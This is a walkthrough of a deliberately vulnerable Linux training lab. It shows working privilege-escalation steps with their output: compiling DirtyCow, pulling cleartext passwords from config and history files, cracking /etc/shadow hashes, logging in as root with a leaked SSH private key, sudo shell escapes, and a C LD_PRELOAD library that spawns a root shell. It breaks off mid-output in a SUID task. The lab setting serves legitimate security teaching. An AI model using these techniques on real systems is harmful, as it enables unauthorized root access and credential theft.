# Linux PrivEsc Arena

Students will learn how to escalate privileges using a very vulnerable Linux VM. SSH is open. Your credentials are TCM:Hacker123

#  [Task 3] Privilege Escalation - Kernel Exploits

**Detection**

Linux VM

1. In command prompt type: `/home/user/tools/linux-exploit-suggester/linux-exploit-suggester.sh`
2. From the output, notice that the OS is vulnerable to “dirtycow”.

~~~
TCM@debian:~/tools/linux-exploit-suggester$ ./linux-exploit-suggester.sh 

Kernel version: 2.6.32
Architecture: x86_64
Distribution: debian
Package list: from current OS

Possible Exploits:

[+] [CVE-2010-3301] ptrace_kmod2

   Details: https://www.exploit-db.com/exploits/15023/
   Tags: debian=6,ubuntu=10.04|10.10
   Download URL: https://www.exploit-db.com/download/15023

[+] [CVE-2010-1146] reiserfs

   Details: https://www.exploit-db.com/exploits/12130/
   Tags: ubuntu=9.10
   Download URL: https://www.exploit-db.com/download/12130

[+] [CVE-2010-2959] can_bcm

   Details: https://www.exploit-db.com/exploits/14814/
   Tags: ubuntu=10.04
   Download URL: https://www.exploit-db.com/download/14814

[+] [CVE-2010-3904] rds

   Details: http://www.securityfocus.com/archive/1/514379
   Tags: debian=6,ubuntu=10.10|10.04|9.10,fedora=16
   Download URL: https://www.exploit-db.com/download/15285

[+] [CVE-2010-3848,CVE-2010-3850,CVE-2010-4073] half_nelson

   Details: https://www.exploit-db.com/exploits/17787/
   Tags: ubuntu=10.04|9.10
   Download URL: https://www.exploit-db.com/download/17787

[+] [CVE-2010-4347] american-sign-language

   Details: https://www.exploit-db.com/exploits/15774/
   Download URL: https://www.exploit-db.com/download/15774

[+] [CVE-2010-3437] pktcdvd

   Details: https://www.exploit-db.com/exploits/15150/
   Tags: ubuntu=10.04
   Download URL: https://www.exploit-db.com/download/15150

[+] [CVE-2010-3081] video4linux

   Details: https://www.exploit-db.com/exploits/15024/
   Tags: RHEL=5
   Download URL: https://www.exploit-db.com/download/15024

[+] [CVE-2012-0056,CVE-2010-3849,CVE-2010-3850] full-nelson

   Details: http://vulnfactory.org/exploits/full-nelson.c
   Tags: ubuntu=9.10|10.04|10.10,ubuntu=10.04.1
   Download URL: http://vulnfactory.org/exploits/full-nelson.c

[+] [CVE-2013-2094] perf_swevent

   Details: http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/
   Tags: RHEL=6,ubuntu=12.04
   Download URL: https://www.exploit-db.com/download/26131

[+] [CVE-2013-2094] perf_swevent 2

   Details: http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/
   Tags: ubuntu=12.04
   Download URL: https://cyseclabs.com/exploits/vnik_v1.c

[+] [CVE-2013-0268] msr

   Details: https://www.exploit-db.com/exploits/27297/
   Download URL: https://www.exploit-db.com/download/27297

[+] [CVE-2013-2094] semtex

   Details: http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/
   Tags: RHEL=6
   Download URL: https://www.exploit-db.com/download/25444

[+] [CVE-2014-0196] rawmodePTY

   Details: http://blog.includesecurity.com/2014/06/exploit-walkthrough-cve-2014-0196-pty-kernel-race-condition.html
   Download URL: https://www.exploit-db.com/download/33516

[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Tags: RHEL=5|6|7,debian=7|8,ubuntu=16.10|16.04|14.04|12.04
   Download URL: https://www.exploit-db.com/download/40611

[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Tags: RHEL=5|6|7,debian=7|8,ubuntu=16.10|16.04|14.04|12.04
   Download URL: https://www.exploit-db.com/download/40616

[+] [CVE-2017-6074] dccp

   Details: http://www.openwall.com/lists/oss-security/2017/02/22/3
   Tags: ubuntu=16.04
   Download URL: https://www.exploit-db.com/download/41458
   Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass

[+] [CVE-2009-1185] udev

   Details: https://www.exploit-db.com/exploits/8572/
   Tags: ubuntu=8.10|9.04
   Download URL: https://www.exploit-db.com/download/8572
   Comments: Version<1.4.1 vulnerable but distros use own versioning scheme. Manual verification needed 

[+] [CVE-2009-1185] udev 2

   Details: https://www.exploit-db.com/exploits/8478/
   Download URL: https://www.exploit-db.com/download/8478
   Comments: SSH access to non privileged user is needed. Version<1.4.1 vulnerable but distros use own versioning scheme. Manual verification needed

[+] [CVE-2010-0832] PAM MOTD

   Details: https://www.exploit-db.com/exploits/14339/
   Tags: ubuntu=9.10|10.04
   Download URL: https://www.exploit-db.com/download/14339
   Comments: SSH access to non privileged user is needed

[+] [CVE-2016-1247] nginxed-root.sh

   Details: https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html
   Tags: debian=8,ubuntu=14.04|16.04|16.10
   Download URL: https://legalhackers.com/exploits/CVE-2016-1247/nginxed-root.sh
   Comments: Rooting depends on cron.daily (up to 24h of dealy). Affected: deb8: <1.6.2; 14.04: <1.4.6; 16.04: 1.10.0

TCM@debian:~/tools/linux-exploit-suggester$ 
~~~

**Exploitation**

Linux VM

1. In command prompt type: `gcc -pthread /home/user/tools/dirtycow/c0w.c -o c0w`
2. In command prompt type: `./c0w`

Disclaimer: This part takes 1-2 minutes - Please allow it some time to work.

3. In command prompt type: `passwd`
4. In command prompt type: `id`

~~~
TCM@debian:~/tools/dirtycow$ ll
total 8
-rw-r--r-- 1 TCM user 4368 May 15  2017 c0w.c
TCM@debian:~/tools/dirtycow$ gcc -pthread c0w.c -o c0w
TCM@debian:~/tools/dirtycow$ ll
total 20
-rwxr-xr-x 1 TCM user 10278 Aug 24 16:37 c0w
-rw-r--r-- 1 TCM user  4368 May 15  2017 c0w.c
TCM@debian:~/tools/dirtycow$ ./c0w 
                                
   (___)                                   
   (o o)_____/                             
    @@ `     \                            
     \ ____, //usr/bin/passwd                          
     //    //                              
    ^^    ^^                               
DirtyCow root privilege escalation
Backing up /usr/bin/passwd to /tmp/bak
mmap 76334000

madvise 0

ptrace 0

TCM@debian:~/tools/dirtycow$ passwd
root@debian:/home/user/tools/dirtycow# id
uid=0(root) gid=1000(user) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
root@debian:/home/user/tools/dirtycow# whoami
root
~~~

From here, either copy /tmp/passwd back to /usr/bin/passwd or reset your machine to undo changes made to the passwd binary

~~~
root@debian:/home/user/tools/dirtycow# cp /tmp/bak /usr/bin/passwd 
~~~

# [Task 4] Privilege Escalation - Stored Passwords (Config Files)

**Exploitation**

Linux VM

1. In command prompt type: `cat /home/user/myvpn.ovpn`
2. From the output, make note of the value of the “auth-user-pass” directive.

~~~
TCM@debian:~$ cat /home/user/myvpn.ovpn
client
dev tun
proto udp
remote 10.10.10.10 1194
resolv-retry infinite
nobind
persist-key
persist-tun
ca ca.crt
tls-client
remote-cert-tls server
auth-user-pass /etc/openvpn/auth.txt
comp-lzo
verb 1
reneg-sec 0
~~~

3. In command prompt type: `cat /etc/openvpn/auth.txt`
4. From the output, make note of the clear-text credentials.

~~~
TCM@debian:~$ cat /etc/openvpn/auth.txt
user
password321
~~~

5. In command prompt type: `cat /home/user/.irssi/config | grep -i passw`
6. From the output, make note of the clear-text credentials.

~~~
TCM@debian:~$ cat /home/user/.irssi/config | grep -i passw
    autosendcmd = "/msg nickserv identify password321 ;wait 2000";
~~~

## 4.1 - What password did you find?

Answer: `password321`

## 4.2 - What user's credentials were exposed in the OpenVPN auth file?

Answer: `user`


# [Task 5] Privilege Escalation - Stored Passwords (History)

**Exploitation**

Linux VM

1. In command prompt type: `cat ~/.bash_history | grep -i passw`
2. From the output, make note of the clear-text credentials.

~~~
TCM@debian:~$ cat ~/.bash_history | grep -i passw
mysql -h somehost.local -uroot -ppassword123
cat /etc/passwd | cut -d: -f1
awk -F: '($3 == "0") {print}' /etc/passwd
~~~

## 5.1 - What was TCM trying to log into?

Answer: `mysql`

## 5.2 - Who was TCM trying to log in as?

Answer: `root`

## 5.3 - Naughty naughty.  What was the password discovered?

Answer: `password123`


# [Task 6] Privilege Escalation - Weak File Permissions

**Detection**

Linux VM

1. In command prompt type: `ls -la /etc/shadow`
2. Note the file permissions

The `/etc/shadow` file is readable by anybody, which is incorrect.

~~~
TCM@debian:~$ ls -la /etc/shadow
-rw-rw-r-- 1 root shadow 809 Jun 17 23:33 /etc/shadow
~~~

**Exploitation**

Linux VM

1. In command prompt type: `cat /etc/passwd`
2. Save the output to a file on your attacker machine

~~~
TCM@debian:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
Debian-exim:x:101:103::/var/spool/exim4:/bin/false
sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin
statd:x:103:65534::/var/lib/nfs:/bin/false
TCM:x:1000:1000:user,,,:/home/user:/bin/bash
~~~

3. In command prompt type: `cat /etc/shadow`
4. Save the output to a file on your attacker machine

~~~
TCM@debian:~$ cat /etc/shadow
root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
daemon:*:17298:0:99999:7:::
bin:*:17298:0:99999:7:::
sys:*:17298:0:99999:7:::
sync:*:17298:0:99999:7:::
games:*:17298:0:99999:7:::
man:*:17298:0:99999:7:::
lp:*:17298:0:99999:7:::
mail:*:17298:0:99999:7:::
news:*:17298:0:99999:7:::
uucp:*:17298:0:99999:7:::
proxy:*:17298:0:99999:7:::
www-data:*:17298:0:99999:7:::
backup:*:17298:0:99999:7:::
list:*:17298:0:99999:7:::
irc:*:17298:0:99999:7:::
gnats:*:17298:0:99999:7:::
nobody:*:17298:0:99999:7:::
libuuid:!:17298:0:99999:7:::
Debian-exim:!:17298:0:99999:7:::
sshd:*:17298:0:99999:7:::
statd:*:17299:0:99999:7:::
TCM:$6$hDHLpYuo$El6r99ivR20zrEPUnujk/DgKieYIuqvf9V7M.6t6IZzxpwxGIvhqTwciEw16y/B.7ZrxVk1LOHmVb/xyEyoUg.:18431:0:99999:7:::
~~~

Attacker VM

1. In command prompt type: `unshadow <PASSWORD-FILE> <SHADOW-FILE> > unshadowed.txt`

Now, you have an unshadowed file.  We already know the password, but you can use your favorite hash cracking tool to crack dem hashes. For example: `hashcat -m 1800 unshadowed.txt rockyou.txt -O`

~~~
$ /usr/sbin/unshadow passwd shadow > unshadowed.txt
$ hashcat -m 1800 unshadowed.txt /usr/share/wordlists/rockyou.txt -O
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.5, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i7-4800MQ CPU @ 2.70GHz, 2870/2934 MB (1024 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 15

Hashfile 'unshadowed.txt' on line 2 (daemon:*:1:1:daemon:/usr/sbin:/bin/sh): Token length exception
Hashfile 'unshadowed.txt' on line 3 (bin:*:2:2:bin:/bin:/bin/sh): Token length exception
Hashfile 'unshadowed.txt' on line 4 (sys:*:3:3:sys:/dev:/bin/sh): Token length exception
Hashfile 'unshadowed.txt' on line 5 (sync:*:4:65534:sync:/bin:/bin/sync): Token length exception
Hashfile 'unshadowed.txt' on line 6 (games:*:5:60:games:/usr/games:/bin/sh): Token length exception
Hashfile 'unshadowed.txt' on line 7 (man:*:6:12:man:/var/cache/man:/bin/sh): Token length exception
Hashfile 'unshadowed.txt' on line 8 (lp:*:7:7:lp:/var/spool/lpd:/bin/sh): Token length exception
Hashfile 'unshadowed.txt' on line 9 (mail:*:8:8:mail:/var/mail:/bin/sh): Token length exception
Hashfile 'unshadowed.txt' on line 10 (news:*:9:9:news:/var/spool/news:/bin/sh): Token length exception
Hashfile 'unshadowed.txt' on line 11 (uucp:*...:10:uucp:/var/spool/uucp:/bin/sh): Token length exception
Hashfile 'unshadowed.txt' on line 12 (proxy:*:13:13:proxy:/bin:/bin/sh): Token length exception
Hashfile 'unshadowed.txt' on line 13 (www-da...:33:33:www-data:/var/www:/bin/sh): Token length exception
Hashfile 'unshadowed.txt' on line 14 (backup...4:34:backup:/var/backups:/bin/sh): Token length exception
Hashfile 'unshadowed.txt' on line 15 (list:*...g List Manager:/var/list:/bin/sh): Token length exception
Hashfile 'unshadowed.txt' on line 16 (irc:*:39:39:ircd:/var/run/ircd:/bin/sh): Token length exception
Hashfile 'unshadowed.txt' on line 17 (gnats:...m (admin):/var/lib/gnats:/bin/sh): Token length exception
Hashfile 'unshadowed.txt' on line 18 (nobody...5534:nobody:/nonexistent:/bin/sh): Token length exception
Hashfile 'unshadowed.txt' on line 19 (libuui...00:101::/var/lib/libuuid:/bin/sh): Token length exception
Hashfile 'unshadowed.txt' on line 20 (Debian...103::/var/spool/exim4:/bin/false): Token length exception
Hashfile 'unshadowed.txt' on line 21 (sshd:*...:/var/run/sshd:/usr/sbin/nologin): Token length exception
Hashfile 'unshadowed.txt' on line 22 (statd:...3:65534::/var/lib/nfs:/bin/false): Token length exception
Hashes: 2 digests; 2 unique digests, 2 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Optimized-Kernel
* Zero-Byte
* Uses-64-Bit

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 64 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 4 secs

$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:password123

[REDACTED]
~~~

## 6.1 - What were the file permissions on the /etc/shadow file?

Answer: `-rw-rw-r--`


# [Task 7] Privilege Escalation - SSH Keys

**Detection**

Linux VM

1. In command prompt type: `find / -name authorized_keys 2> /dev/null`
2. In a command prompt type: `find / -name id_rsa 2> /dev/null`
3. Note the results.

~~~
TCM@debian:~$ find / -name authorized_keys 2> /dev/null
TCM@debian:~$ find / -name id_rsa 2> /dev/null
/backups/supersecretkeys/id_rsa
~~~

**Exploitation**

Linux VM

1. Copy the contents of the discovered `id_rsa` file to a file on your attacker VM.

~~~
TCM@debian:~$ cat /backups/supersecretkeys/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
STOMIZSSBDSfkAAAAJcm9vdEBrYWxpAQI=
-----END OPENSSH PRIVATE KEY-----
~~~

Attacker VM

1. In command prompt type: `chmod 400 id_rsa`
2. In command prompt type: `ssh -i id_rsa root@<ip>`

You should now have a root shell :)

~~~
kali@kali:/data/Linux_PrivEsc_Arena/files$ chmod 400 id_rsa 
kali@kali:/data/Linux_PrivEsc_Arena/files$ ssh -i id_rsa root@10.10.106.230
Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Jun 17 23:31:40 2020 from 192.168.4.51
root@debian:~# whoami
root
root@debian:~# 
~~~

## 7.1 - What's the full file path of the sensitive file you discovered?

Answer: `/backups/supersecretkeys/id_rsa`


# [Task 8] Privilege Escalation - Sudo (Shell Escaping)

**Detection﻿**

Linux VM

1. In command prompt type: `sudo -l`
2. From the output, notice the list of programs that can run via sudo.

~~~
TCM@debian:~$ sudo -l
Matching Defaults entries for TCM on this host:
    env_reset, env_keep+=LD_PRELOAD

User TCM may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more
~~~

**Exploitation**

Linux VM

1. In command prompt type any of the following:

~~~
$ sudo find /bin -name nano -exec /bin/sh \;
$ sudo awk 'BEGIN {system("/bin/sh")}'
$ echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse
$ sudo vim -c '!sh'
~~~

Output for `find`:

~~~
TCM@debian:~$ sudo find /bin -name nano -exec /bin/bash \;
root@debian:/home/user# whoami
root
~~~

With vim:

~~~
TCM@debian:~$ sudo vim -c '!bash'

root@debian:/home/user# whoami
root
~~~

# [Task 9] Privilege Escalation - Sudo (Abusing Intended Functionality)

**Detection**

Linux VM

1. In command prompt type: `sudo -l`
2. From the output, notice the list of programs that can run via sudo.

~~~
TCM@debian:~$ sudo -l
Matching Defaults entries for TCM on this host:
    env_reset, env_keep+=LD_PRELOAD

User TCM may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more
~~~

**Exploitation**

Linux VM

1. In command prompt type: `sudo apache2 -f /etc/shadow`
2. From the output, copy the root hash.

~~~
TCM@debian:~$ sudo apache2 -f /etc/shadow
Syntax error on line 1 of /etc/shadow:
Invalid command 'root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::', perhaps misspelled or defined by a module not included in the server configuration
~~~

Attacker VM

1. Open command prompt and type: `echo '[Pasted Root Hash]' > hash.txt`
2. In command prompt type: `john --wordlist=/usr/share/wordlists/nmap.lst hash.txt`
3. From the output, notice the cracked credentials.

~~~
kali@kali:/data/Linux_PrivEsc_Arena/files$ echo 'root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::' > roothash.txt
kali@kali:/data/Linux_PrivEsc_Arena/files$ /data/src/john/run/john roothash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password123      (root)
1g 0:00:00:01 DONE (2020-08-24 23:14) 0.7518g/s 1154p/s 1154c/s 1154C/s cuties..mexico1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
~~~

# [Task 10] Privilege Escalation - Sudo (LD_PRELOAD)

**Detection**

Linux VM

1. In command prompt type: `sudo -l`
2. From the output, notice that the `LD_PRELOAD` environment variable is intact.

~~~
TCM@debian:~$ sudo -l
Matching Defaults entries for TCM on this host:
    env_reset, env_keep+=LD_PRELOAD

User TCM may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more
~~~

**Exploitation**

1. Open a text editor and type:

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

2. Save the file as `x.c`
3. In command prompt type: `gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles`
4. In command prompt type: `sudo LD_PRELOAD=/tmp/x.so apache2`
5. In command prompt type: `id`

~~~
TCM@debian:~$ gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
TCM@debian:~$ sudo LD_PRELOAD=/tmp/x.so apache2
root@debian:/home/user# id
uid=0(root) gid=0(root) groups=0(root)
~~~


# [Task 11] Privilege Escalation - SUID (Shared Object Injection)

**Detection**

Linux VM

1. In command prompt type: `find / -type f -perm -04000 -ls 2>/dev/null`
2. From the output, make note of all the SUID binaries.

~~~
TCM@debian:~$ find / -type f -perm -04000 -ls 2>/dev/null
809081   40 -rwsr-xr-x   1 root     root        37552 Feb 15  2011 /usr/bin/chsh
812578  172 -rwsr-xr-x   2 root     root       168136 Jan  5  2016 /usr/bin/sudo
810173   36 -rwsr-xr-x   1 root     root        32808 Feb 15  2011 /usr/bin/newgrp
812578  172 -rwsr-xr-x   2 root     root       168136 Jan  5  2016 /usr/bin/sudoedit
809080   44 -rwsr-xr-x   1 root     root        43280 Jun 18 13:02 /usr/bin/passwd
809078   64 -rwsr-xr-x   1 root     root        60208 Feb 15  2011 /usr/bin/gpasswd
809077   40 -rwsr-xr-x   1 root     root        39856 Feb 15  2011 /usr/bin/chfn
816078   12 -rwsr-sr-x   1 root     staff        9861 May 14  2017 /usr/local/bin/suid-so
816762    8 -rwsr-sr-x   1 root     staff        6883 May 14  2017 /usr/local/bin/suid-env
816764    8 -rwsr-sr-x   1 root     staff        6899 May 14  2017 /usr/local/bin/suid-env2
815723  948 -rwsr-xr-x   1 root     root       963691 May 13  2017 /usr/sbin/exim-4.84-3
832517    8 -rwsr-xr-x   1 root     root         6776 Dec 19  2010 /usr/lib/eject/dmcrypt-get-device
832743  212 -rwsr-xr-x   1 root     root       212128 Apr  2  2014 /usr/lib/openssh/ssh-keysign
812623   12 -rwsr-xr-x   1 root     root        10592 Feb 15  2016 /usr/lib/pt_chown
473324   36 -rwsr-xr-x   1 root     root        36640 Oct 14  2010 /bin/ping6
473323   36 -rwsr-xr-x   1 root     root        34248 Oct 14  2010 /bin/ping
473292   84 -rwsr-xr-x   1 root     root        78616 Jan 25  2011 /bin/mount
473312   36 -rwsr-xr-x   1 root     root        34024 Feb 15  2011 /bin/su
473290   60 -rwsr-xr-x   1 root     root        53648 Jan 25  2011 /bin/umount
465223  100 -rwsr-xr-x   1 root     root        94992 Dec 13  2014 /sbin/mount.nfs
TCM@debian:~$ 
~~~

3. In command line type: `strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"`
4. From the output, notice that a `.so` file is missing from a writable directory.

~~~
TCM@debian:~$ strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY)      = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libdl.so.2", O_RDONLY)       = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/usr/lib/libstdc++.so.6", O_RDONLY) = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libm.so.6", O_RDONLY)        = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libgcc_s.so.1", O_RDONLY)    = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libc.so.6", O_RDONLY)        = 3
